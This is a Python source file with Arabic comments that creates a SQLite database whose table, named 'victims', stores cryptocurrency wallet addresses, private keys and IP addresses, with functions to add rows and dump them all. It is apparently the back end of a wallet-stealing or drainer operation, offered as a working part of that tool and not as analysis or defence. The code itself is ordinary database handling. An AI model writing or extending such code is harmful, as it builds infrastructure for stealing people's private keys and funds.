import sqlite3

DB_NAME = "data.db"

def init_db():
    """ 🔥 إنشاء قاعدة البيانات إذا لم تكن موجودة مسبقًا """
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT, 
                 wallet_address TEXT, 
                 private_key TEXT, 
                 ip TEXT, 
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

def insert_data(wallet, private_key, ip):
    """ 🛠️ إدخال بيانات جديدة إلى قاعدة البيانات """
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO victims (wallet_address, private_key, ip) VALUES (?, ?, ?)",
              (wallet, private_key, ip))
    conn.commit()
    conn.close()

def get_all_data():
    """ 📊 جلب جميع البيانات من القاعدة """
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM victims")
    data = c.fetchall()
    conn.close()
    return data

# تشغيل الدالة لإنشاء القاعدة عند تشغيل المشروع
init_db()
